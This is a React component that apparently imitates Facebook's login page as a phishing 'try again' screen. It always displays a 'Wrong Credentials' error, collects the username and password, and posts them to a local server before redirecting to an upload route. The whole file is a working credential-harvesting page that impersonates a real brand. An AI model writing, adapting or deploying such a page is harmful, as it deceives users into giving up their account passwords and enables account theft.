
import React, { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

function Tryagain() {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [errorMessage, setErrorMessage] = useState('');
    const [loginAttempted, setLoginAttempted] = useState(false);
    const navigate = useNavigate();

    const Tryagain = async (e) => {
        e.preventDefault();
        setLoginAttempted(true);

        // Trimite datele către server
        await axios.post('http://localhost:3000/tryagain', { username, password })
        .then(res => {
            if (res.data.status === 'error') {
                setErrorMessage(res.data.message);
              } else{
                navigate('/Upload');
              }
        })
        .catch(error => {
            console.error('Eroare la trimiterea datelor către server:', error);
        });
    };

  return (
    <div>
      <form onSubmit={Tryagain}>
      {loginAttempted && errorMessage && <div className="error-message">{errorMessage}</div>}
        <p id="face-id"><strong>facebook</strong></p>
        <div id='form-div'>
          <div
            id='error-message'
            style={{
              border: '2px solid red',
              padding: '10px',
              marginBottom: '10px',
              color: 'red',
            }}
          >
            <p>Wrong Credentials<br />Invalid username or password</p>
          </div>
          <br />
          <input
            type='text'
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder='Email Address or Phone number'
          />
          <br />
          <input
            type='password'
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder='Password'
          />
          <br />
          <button type='submit' id='btt-login'>
            Log in
          </button>
          <br />
          
          <br />
          <hr />
          <br />
          <button id='btt-newaccount'>Create new account</button>
          <br />
        </div>
      </form>
      <div id='last-para'>
        <b>
          <p id='last-link'>Create a Page</p>
        </b>{' '}
        for a celebrity, brand, or business.
      </div>
    </div>
  );
}

export default Tryagain;
